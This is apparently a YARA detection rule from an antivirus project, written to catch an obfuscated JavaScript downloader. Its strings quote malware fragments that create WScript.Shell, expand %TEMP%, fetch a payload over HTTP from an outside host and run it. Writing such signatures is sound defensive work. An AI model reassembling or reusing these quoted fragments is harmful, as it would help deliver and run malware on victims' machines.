rule sig_20160427_ebb383549d0d255acad0c8bc38322b01 {
  meta:
    description = "datamaliciousorder - file 20160427_ebb383549d0d255acad0c8bc38322b01.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a27d893c1eba08326ad9eaa058f0357bc23aaef236809e800068ab382ea425fe"

  strings:
    $s1  = "function IguqdMqdbj() {return WzknwNvscr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xCgnIpk" ascii
    $s2  = "function IguqdMqdbj() {return WzknwNvscr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xCgnIpk" ascii
    $s3  = "var WzknwNvscr = function GxbycUarvc() {return BndbvKvobv[XmxwxNszfj](\"WScript\"+\".Shell\");}(), MfohxVbtjr = 11;" fullword ascii
    $s4  = "function LmuabDsojj(ZloyeAhvdb, ZnqlbMqmfh){UfknkWnsmi = UfknkWnsmi * 1; return ZloyeAhvdb - ZnqlbMqmfh;};" fullword ascii
    $s5  = "WipyeMxjpw[UmmaxKodkw](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s6  = "var BndbvKvobv = this[\"WScript\"];" fullword ascii
    $s7  = "if (WipyeMxjpw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function OgkiaThgpu() {return ((IvoqtRqnaf == true) && (IvoqtRqnaf == HitlzQfmer)) ? 1 : UfknkWnsmi;};" fullword ascii
    $s9  = "function PiyquSjcaz(){return WllowSyiox + \"\";};" fullword ascii
    $s10 = "}while (ZhjqgHlccw);" fullword ascii
    $s11 = "function OvgjuNzdro(IljnxDcwih){WzknwNvscr[\"R\"+\"un\"](IljnxDcwih, UfknkWnsmi, UfknkWnsmi);};" fullword ascii
    $s12 = "function BqwvlArbmd(){return 23;};" fullword ascii
    $s13 = "return LmuabDsojj(PwkzzIfwkk, MbgywDcetl);" fullword ascii
    $s14 = "var PhgdnQnrxs = false;" fullword ascii
    $s15 = "HitlzQfmer = true; " fullword ascii
    $s16 = "var OjvdhYollu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "IvoqtRqnaf = true; " fullword ascii
    $s18 = "var IvoqtRqnaf = false;" fullword ascii
    $s19 = "var HitlzQfmer = false;" fullword ascii
    $s20 = "PhgdnQnrxs = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}